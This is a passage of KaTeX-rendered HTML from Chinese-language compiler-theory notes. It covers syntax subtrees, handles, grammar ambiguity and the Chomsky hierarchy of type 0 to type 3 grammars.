style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，则一定存在规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><msub><mi>A</mi><mi>i</mi></msub><mo separator=\"true\">,</mo><mi>i</mi><mo>=</mo><mn>1...</mn><mi>k</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow A_{i}, i=1...k</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">i</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord mathdefault\" style=\"margin-right:0.03148em;\">k</span></span></span></span>。</li>\n</ol>\n<h4 id=\"子树和简单子树\"><a class=\"markdownIt-Anchor\" href=\"#子树和简单子树\"></a> 子树和简单子树</h4>\n<p>由于即使是同一课语法树，也有可能对应于多种不同的推导过程。而引入子树和简单子树，则是为了找到<strong>句型短语和句柄</strong>。</p>\n<h5 id=\"子树\"><a class=\"markdownIt-Anchor\" href=\"#子树\"></a> 子树</h5>\n<p>任一非root结点和其所有结点的分支就是子树。</p>\n<h5 id=\"简单子树\"><a class=\"markdownIt-Anchor\" href=\"#简单子树\"></a> 简单子树</h5>\n<p>只具有<strong>单层分支</strong>的子树称为简单子树。</p>\n<ol>\n<li>对于该语法树对应的<strong>句型</strong>，子树的末端结点形成的符号串是<strong>相对于子树root的短语</strong>。</li>\n<li>简单子树的末端结点形成的符号串是相对于简单子树root的<strong>直接短语</strong>。</li>\n<li>最左简单子树的末端结点形成的符号串是<strong>句柄</strong>。</li>\n</ol>\n<h3 id=\"文法的二义性\"><a class=\"markdownIt-Anchor\" href=\"#文法的二义性\"></a> 文法的二义性</h3>\n<p>当存在不同的最左（最右）推导时，产生的语法树也不同。</p>\n<p>文法的句型是否只对迎着唯一的一颗语法树？<br />\n是否只有唯一的最左（最右）推导？</p>\n<p>若某个句子对应两颗不同的语法树，则说该文法是<strong>二义性</strong>的。</p>\n<h4 id=\"二义性的消除\"><a class=\"markdownIt-Anchor\" href=\"#二义性的消除\"></a> 二义性的消除</h4>\n<ol>\n<li>不改变语法规则，加一些语法的非形式规定。比如运算符的优先级。</li>\n<li>构造一个等价的无二义性的文法。</li>\n</ol>\n<p><strong>不存在一个算法，能在有限的步骤内判定一个文法是否为二义性的。</strong></p>\n<h3 id=\"文法和语言的分类\"><a class=\"markdownIt-Anchor\" href=\"#文法和语言的分类\"></a> 文法和语言的分类</h3>\n<p>假设存在文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<h4 id=\"0型文法无限制文法\"><a class=\"markdownIt-Anchor\" href=\"#0型文法无限制文法\"></a> 0型文法（无限制文法）</h4>\n<p>若文法中每条规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha \\rightarrow \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>都满足下列要求：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\alpha \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>且至少包含一个nonterminal。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n<p>则该文法是0型文法，其描述的语言为0型语言。</p>\n<p>0型语言又称为无限制性语言。</p>\n<h4 id=\"1型文法上下文有关文法\"><a class=\"markdownIt-Anchor\" href=\"#1型文法上下文有关文法\"></a> 1型文法（上下文有关文法）</h4>\n<p>若文法中每条规则的形式为：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mi>A</mi><mi>β</mi><mo>→</mo><mi>α</mi><mi>u</mi><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha A \\beta \\rightarrow \\alpha u \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">u</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，满足：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo separator=\"true\">,</mo><mi>β</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\alpha,\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>u</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>+</mo></msup></mrow><annotation encoding=\"application/x-tex\">u \\in \\left(V_{N} \\cup V_{T}\\right)^{+}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">u</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.161231em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.911231em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n<p>则该文法是1型文法，其描述的语言为1型语言。</p>\n<p>因为在利用规则将<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>替换为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>u</mi></mrow><annotation encoding=\"application/x-tex\">u</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">u</span></span></span></span>时，必须考虑其上下文环境（<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>α</mi><mo separator=\"true\">,</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">\\alpha, \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>），且不允许替换为空字符串，因此也成为<strong>上下文有关文法</strong>。</p>\n<h4 id=\"2型文法上下文无关文法\"><a class=\"markdownIt-Anchor\" href=\"#2型文法上下文无关文法\"></a> 2型文法（上下文无关文法）</h4>\n<p>若文法中每一条规则的形式为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>β</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow \\beta</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span></span></span>，且满足：</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>∈</mo><msub><mi>V</mi><mi>N</mi></msub></mrow><annotation encoding=\"application/x-tex\">A \\in V_{N}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72243em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>β</mi><mo>∈</mo><msup><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><mo fence=\"true\">)</mo></mrow><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">\\beta \\in \\left(V_{N} \\cup V_{T}\\right)^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>。</li>\n</ol>\n<p>编译原理课程所主要研究对象为上下文无关文法。</p>\n<h4 id=\"3型文法正规文法\"><a class=\"markdownIt-Anchor\" href=\"#3型文法正规文法\"></a> 3型文法（正规文法）</h4>\n<ul>\n<li>若每条规则的形式为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow \\alpha B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" 